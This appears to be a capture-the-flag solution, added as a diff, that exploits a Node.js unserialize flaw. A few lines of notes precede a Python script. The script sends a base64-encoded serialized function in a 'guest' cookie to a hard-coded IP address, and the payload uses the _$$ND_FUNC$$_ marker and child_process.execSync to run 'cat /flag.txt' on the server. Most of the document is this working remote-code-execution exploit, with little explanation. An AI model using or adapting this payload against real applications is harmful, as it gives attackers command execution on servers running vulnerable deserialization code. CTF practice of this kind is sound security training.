@@ -1,0 +1,26 @@
+This problem involves exloiting the unserialize vulnerability which 
+which executes a function if the serialized version of it contained
+the function call
+
+Below is the python file | the username part of the cookie can also
+be put in cookie editor extension without the use of this program
+
+(base 64 encoded of serialized of a function )() ---> the () is added
+after the serialization otherwise it doesnt get serialized
+
+and then the whole thing is base64 encoded
+
+import requests
+import base64
+
+r = requests.post('http://35.226.73.105:7777/joinus', headers = {
+    'Cookie': b'guest=' + base64.b64encode(b'''
+{"username":{"toString":"_$$ND_FUNC$$_(()=>{throw require('child_process').execSync('cat /flag.txt')})()"}}
+'''.strip())
+})
+
+x=base64.b64encode(b'''
+{"username":{"toString":"_$$ND_FUNC$$_(()=>{throw require('child_process').execSync('cat /flag.txt')})()"}}
+'''.strip())
+
+print(r.text)
